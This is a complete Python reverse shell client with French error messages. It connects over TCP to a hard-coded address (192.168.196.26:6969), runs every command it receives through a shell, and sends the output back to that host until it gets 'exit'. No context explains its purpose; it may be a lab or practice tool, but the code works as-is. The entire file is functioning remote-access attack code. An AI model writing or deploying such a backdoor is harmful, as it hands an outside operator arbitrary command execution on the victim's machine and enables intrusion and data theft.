import socket
import subprocess

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect(("192.168.196.26", 6969))

        while True:
            command = s.recv(1024).decode("utf-8")
            if command == "exit":
                s.close()
                break

            try:
                CMD = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                output = CMD.stdout
            except Exception as e:
                output = str(e).encode("utf-8")

            try:
                s.sendall(output)
            except Exception as e:
                print("Erreur lors de l'envoi des données au serveur:", e)
                break

    except Exception as e:
        print("Erreur lors de la connexion au serveur:", e)
    finally:
        s.close()

if __name__ == "__main__":
    main()
